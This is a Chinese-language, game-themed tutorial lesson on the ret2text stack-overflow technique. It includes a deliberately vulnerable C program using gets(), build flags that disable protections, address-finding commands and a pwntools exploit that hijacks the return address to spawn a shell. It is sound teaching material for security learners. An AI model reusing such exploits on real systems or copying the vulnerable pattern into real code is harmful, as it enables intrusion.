# 第 8 关 · ret2text：跳到隐藏关卡

## 🎬 游戏开场

你打通了第 7 关，靠的是"跳到程序自带的 backdoor 函数"。这招有个正式名字：**ret2text**——"return to text"，即把返回地址改成**程序代码段（.text）里的某个地方**。

用游戏的话说：

> 你没造新技能，也没请外援，你只是把"回城卷轴"涂成了**游戏里本来就存在的一个隐藏关卡入口**。

因为那个入口本来就在游戏里，所以它一定存在、一定可执行（NX 也拿它没办法）。这是最干净、最优雅的一招。

---

## 🧠 核心概念（游戏版）

### 1. ret2text 的三种"隐藏关卡"

程序代码段里，能帮你拿 shell 的东西通常有这几种：

**① 现成的后门函数**

最理想，就像第 7 关的：

```c
void backdoor() { system("/bin/sh"); }
```

直接把返回地址改成它的地址，完事。

**② 现成的 `system` 调用 + 字符串**

程序自己调用了 `system`，而某个地方存着 `/bin/sh` 字符串：

```c
system("echo hello");   // 代码里有 system 的调用
// 某处有 "/bin/sh" 字符串（可能是残留数据）
```

如果找不到后门函数，可以跳到"调用 system 的那条指令"，并想办法让参数指向 `/bin/sh`。

**③ 代码里的"指令缝隙"**

高级玩法：有时候 `system` 的参数不是 `/bin/sh`，但代码里有 `mov rdi, xxx; call system` 这样的片段，你跳到中间某个精妙的位置，正好能满足条件。这需要仔细读汇编——像在游戏地图里找一条隐蔽的小路。

### 2. 找材料的工具箱

| 想找什么 | 命令 |
| --- | --- |
| 找函数地址 | `nm ./vuln \| grep system` / `objdump -d` |
| 找 `/bin/sh` 字符串 | `strings -a -t x ./vuln \| grep /bin/sh` |
| 看 system 的 PLT | `objdump -d ./vuln \| grep system` |
| 找所有函数的地址 | `nm ./vuln` / `readelf -s` |

**注意**：如果程序是 PIE（地址随机），这些地址都是"基于基址的偏移"，需要先泄露基址。新手村的题通常 `-no-pie`，地址固定，直接能用。

### 3. 一个更真实的 ret2text

假设程序里有：

```c
void cheat() {
    system("/bin/sh");   // 隐藏关卡
}
void vuln() {
    char buf[32];
    gets(buf);
}
```

但这次 `cheat` 不是显式调用的"后门"，而是一个没被调用的"死代码"。编译器默认可能优化掉它，用 `-O0` 编译则保留。

exp 和之前一样：

```python
payload = b'A' * offset + p64(cheat_addr)
```

**ret2text 的精髓**：只要代码段里存在任何"能帮你拿 shell 的片段"，你的任务就是找到它、跳过去。

### 4. 参数问题：当后门需要"喂参数"

如果代码里只有：

```asm
lea rdi, [rip+0x...]   ; rdi = "echo hello" 的地址
call system
```

你想让它执行 `/bin/sh`，就得让 rdi 指向 `/bin/sh`。有两种办法：

- **改字符串**：如果 `/bin/sh` 出现在可写的数据区，且 `echo hello` 也在那，可以把它改成 `/bin/sh\0`（利用另一个漏洞写）。
- **跳到 `call system` 前面一点**：找到一条 `mov rdi, ...` 指令，跳过去重新设置参数。

这类"拼凑参数"的技巧，本质上是 ROP 的雏形（第 11 关正式讲）。

---

## 🔧 真实世界对照

| 游戏说法 | 真实术语 |
| --- | --- |
| 隐藏关卡入口 | 程序已有的危险函数/代码片段 |
| 回城卷轴涂改 | 覆盖返回地址为 .text 内地址 |
| ret2text | return-to-text（控制流劫持到代码段） |

**ret2text 的适用条件**：

1. 存在栈溢出（能控制返回地址）。
2. 代码段里存在"有用的代码"（后门函数、system 调用等）。
3. 没有 Canary 挡路（或有办法绕过）。
4. 地址已知（非 PIE，或已泄露基址）。

---

## 🎯 闯关任务：找到"死代码"后门

写这个程序（注意 `cheat` 从来没被调用）：

```c
// ret2text.c
#include <stdio.h>
#include <stdlib.h>

void cheat() {
    system("/bin/sh");
}
void vuln() {
    char buf[16];
    gets(buf);
}
int main() {
    puts("hello pwner");
    vuln();
    return 0;
}
```

```bash
gcc -g -O0 -fno-stack-protector -no-pie ret2text.c -o ret2text
nm ret2text | grep cheat       # 找 cheat 地址
python3 -c "from pwn import *; print(cyclic(40))" | ./ret2text  # 测崩溃
```

写 exp：

```python
from pwn import *
p = process('./ret2text')
cheat = 0x401176       # 换成 nm 查到的地址
p.sendline(b'A'*24 + p64(cheat))
p.interactive()
```

拿到 shell 后，想想：**如果程序里根本没有 cheat 函数，也没有 system("/bin/sh")，怎么办？** 这就是下一关 ret2shellcode 和再下一关 ret2libc 要解决的问题——"自己造技能"或"借系统技能"。

---

## 📌 本关小结

| 你学会了 | 一句话记忆 |
| --- | --- |
| ret2text | 返回地址改成程序自带的危险代码 |
| 找材料 | `nm` 找函数、`strings` 找 `/bin/sh` |
| 适用条件 | 有溢出 + 有后门 + 无 Canary + 地址已知 |
| 参数问题 | 跳到合适位置或改写字符串 |

---

## 🎬 下一关预告

**第 9 关 · ret2shellcode：自己写个作弊码**

程序里没有后门怎么办？自己造一个！

我们会把一段**自己写的机器码**（shellcode）放进内存，然后让返回地址跳过去执行。这需要：

- 找到一块"可写且可执行"的内存（NX 关掉时的栈就是）
- 精确定位 shellcode 的位置（ASLR 关掉才行）
- 用 pwntools 一行生成 shellcode

这是"自带代码"流派的最后一搏——因为下一关开始，NX 保护会让它失效，我们将转向"借代码"（ret2libc/ROP）。
